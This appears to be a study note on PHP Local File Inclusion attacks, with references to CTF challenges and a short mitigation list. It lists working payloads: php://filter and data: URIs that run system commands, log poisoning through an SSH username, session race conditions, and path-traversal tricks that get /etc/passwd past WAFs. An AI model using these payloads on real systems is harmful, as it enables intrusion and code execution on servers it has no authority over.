# Environment  
Here I would put some settings that you need to know before starting on Local File Inclusion. In `php.ini`:  
1. `allow_url_include` (default: off and makes it impossible to RFI)  
2. `session.auto_start` (default: off and makes it hard to create session)  
3. `session.upload_progress.cleanup` (default: On and makes it hard to include the session)  

# Methods to include  
File inclusion is always used to arbitrary code execution:  
1. pseudo protocol  
```php
php://input
// Condition：allow_url_include = on
?file=php://input
POST data: xxx

php://filter
// get base-64 encoded source code
?file=php://filter/read=convert.base64-encode/resource=file.php
// It's important that filter can be used to handle string with various ways, please take a look at the reference#1
php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php

phar://path.zip/file.php
// php5.3.0up, parse the archived file
// Sam Thomas publish a new use of phar able to unserialize without unserialize() function, please take a look at my Unserialization part

zip://path.zip%23file.php
// php5.3.0up, work as phar://, but need absolute path, and need to encode # as %23

data:URL schema
// php5.2up, two settings in php.ini set to on
?file=data:text/plain,<?php phpinfo();?>
?file=data:text/plain,<?php system(ls);?>
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b (base64 encode phpinfo)
```  
More protocol：`file://`,`ftp://`,`zlib://`,`glob://`,`ssh2://`,`rar://`,`ogg://`,`expect://`  

2. Session inclusion  
We can control the content of session, and we also know the path of session...  
Path of session can be got from `session_save_path` in phpinfo  

🍊Include Session in Hitcon CTF 2018 [ONE LINE PHP CHALLENGE](https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html):  
`session.upload_progress.name` ➡️ create session file ➡️ filename: `sess_{PHPSESSID}`  
![](https://github.com/shinmao/Web-Security-Learning/blob/master/LFI/burp_multipart.png)
As long as `PHP_SESSION_UPLOAD_PROGRESS` in POST of multipart/form-data and `session.upload_progress.enabled = On` (fortunately default is on), PHP session files would be created no matter `session.auto_start = 0`! Then to deal with the problem of `session.upload_progress.cleanup = On`, we need race condition.

3. Log inclusion  
**Permission** to read the log?  
Take apache for example, request would be written to `access.log`, and error would be written to `error.log`. The default stored path is `/var/log/apache2/`  
Therefore, attacker always needs to get the path with config file, and pay attention to the fact that whether the request would be encoded (use burp to modify the encoded request), then include the log in the end  

4. SSH log inclusion  
**Permission** to read?  
Default path: `/var/log/apache2/access.log`,`/var/log/apache2/error.log`  
```php
ssh '<?php phpinfo();?>'@remotehost
// phpinfo in log, and include
```  
5. include temp file (lfi with phpinfo)  
Just like the picture in [LFI with PHP7 segfault](#lfi-with-php7-segmentfault), PHP handles `enctype="multipart/form-data"` with following steps. When output from PHP script is larger than output buffer setting (which is always 4096), the partial content would change to `Transfer-Encoding: chunked`. Therefore, what we need to do is to delay the execution time of PHP script. The reason for using phpinfo is getting the tmp file name from `$_FILE`.  

6. include `/proc/self/environ`: php requires to run as CGI  

7. include uploaded file: need uploading functionality on website itself   

# WAF bypass  
* Relative path bypass  
WAF usually detect **continuous** multiple `../`
```php
// according to parsing path

// not change
/./ not change
///./..//.//////./   -> use with conbination
```  
* Absolute path bypass, `/etc/passwd` would be blocked  
```php
/aaa/../etc/passwd
/etc/./passwd
```  

# LFI with PHP7 SegmentFault  
![](https://github.com/shinmao/Web-Security-Learning/blob/master/LFI/php_tmp.PNG)  
In the environment of `ubuntu16+php7.1`:  
```
php://filter/string.strip_tags/resource=xxx
```  
will cause to segmentation fault. Therefore, the tmp file cannot be removed because PHP is crashed, then we can use bruteforce to include the tmp file. With analysis, the bug of PHP is due to the inference of null pointer.

# Inject path to session id
[CVE-2018-18925](https://github.com/vulhub/vulhub/tree/master/gogs/CVE-2018-18925)  
You can try to include the other file as fake session. This is also based on the condition that the library parse the session id in a wrong way.  

# Defense  
Make a conclusion of the requirement above, we can get the following mitigation  
* php `open_basedir`  
* read permission  
* filter of dangerous characters
